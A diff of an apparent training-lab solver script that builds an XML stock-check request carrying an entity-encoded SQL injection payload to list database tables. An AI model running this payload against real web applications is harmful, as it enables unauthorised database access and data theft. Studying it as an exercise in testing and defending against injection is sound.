@@ -45,7 +45,7 @@ def format_payload(query):
     formatted_query = format_query(query)
     return (
         '<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId>'
-        f"<storeId>1&#x20;{formatted_query}</storeId></stockCheck>"
+        f"<storeId>1&#x20;{formatted_query}&#x2d;&#x2d;</storeId></stockCheck>"
 )
     
     
@@ -59,9 +59,9 @@ def main(args):
     shop = Shop(args.url, args.no_proxy, sess)
     url = shop.base_url + "product/stock"
     payload = format_payload(
-        "select table_name from information_schema.tables where table_schema='public'"
+        "SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
                              )
-    log.info("Sending SQLi Payload: {payload}")
+    log.info(f"Sending SQLi Payload: {payload}")
     """
     stop
     :wq"""
